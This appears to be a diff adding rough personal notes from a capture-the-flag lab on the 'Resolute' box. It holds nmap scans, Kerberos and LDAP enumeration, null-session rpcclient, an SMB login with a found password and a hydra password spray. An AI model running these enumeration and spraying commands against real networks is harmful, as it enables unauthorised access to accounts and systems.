@@ -1,0 +1,42 @@
+nmap -Sv -Sc -Pn -p 445 10.10.10.169
+  616  nmap -sC -sV -p 445 -T4 -Pn --min-rate 1000 --max-retries 5 10.10.10.169
+  617  nmap -sC -sV -p 445 -T4 -Pn --min-rate 1000 --max-retries 5 10.10.10.169 > megabank.txt
+
+
+
+ nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='megabank.local',userdb=/usr/share/seclists/Usernames/Names/names.txt 10.10.10.169
+  617  nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='megabank.local',userdb=/usr/share/Seclists/Usernames/Names/names.txt 10.10.10.169
+  618  nmap -p 88 -v --script krb5-enum-users --script-args krb5-enum-users.realm='megabank.local',userdb=/usr/share/Seclists/Usernames/Names/names.txt 10.10.10.169
+  619  sudo nmap -p 88 -v --script krb5-enum-users --script-args krb5-enum-users.realm='megabank.local',userdb=/usr/share/Seclists/Usernames/Names/names.txt 10.10.10.169
+  620  nmap -vv -p389 --script ldap-rootdse 10.10.10.169
+  621  nmap -vv -p389 --script ldap-rootdse 10.10.10.169 > ldap-rootdse.txt
+  622  enum4linux -a 10.10.10.169 > enum4linux.txt
+  
+  
+  rpcclient -U "" 10.10.10.169
+  //// login with no password
+  
+  or 
+  rpcclient -U "" -N -W "MEGABANK" resolute.htb -c querydispinfo
+    
+    after using evil-winrm to login 
+    
+    we got user then search we get
+    
+    cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+    try login with marko user
+  smbclient -L \\\\10.10.10.169  -U marko%Welcome123!
+  error
+  
+  
+  then username enumaretion 
+  
+  hydra -L ./user.txt -p Welcome123! 10.10.10.169 smb
+
+user melanie
+
+again we got error
+
+by checking on all port we got 5985 winrm service
+
+
